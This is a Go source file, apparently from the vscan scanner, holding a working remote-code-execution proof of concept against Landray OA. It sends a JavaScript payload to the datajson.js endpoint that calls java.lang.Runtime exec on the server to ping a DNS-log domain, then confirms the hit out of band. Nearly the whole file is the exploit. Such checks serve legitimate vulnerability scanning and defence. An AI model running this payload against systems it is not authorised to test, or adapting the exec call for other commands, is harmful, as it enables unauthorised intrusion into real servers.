package landray

import (
	"fmt"
	"time"

	"github.com/veo/vscan/pkg"
)

func Landray_RCE(u string) bool {
	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
		randomstr := pkg.RandomStr()
		payload := fmt.Sprintf(`s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 %s")&type=1`, randomstr+"."+pkg.CeyeDomain)

		header := make(map[string]string)
		header["Connection"] = "close"

		pkg.HttpRequset(u+"/data/sys-common/datajson.js?"+payload, "GET", "", false, nil)
		time.Sleep(3 * time.Second)
		if pkg.Dnslogchek(randomstr) {
			pkg.GoPocLog(fmt.Sprintf("Found vuln Landray OA RCE|%s\n", u))
			return true
		}
	}
	return false
}
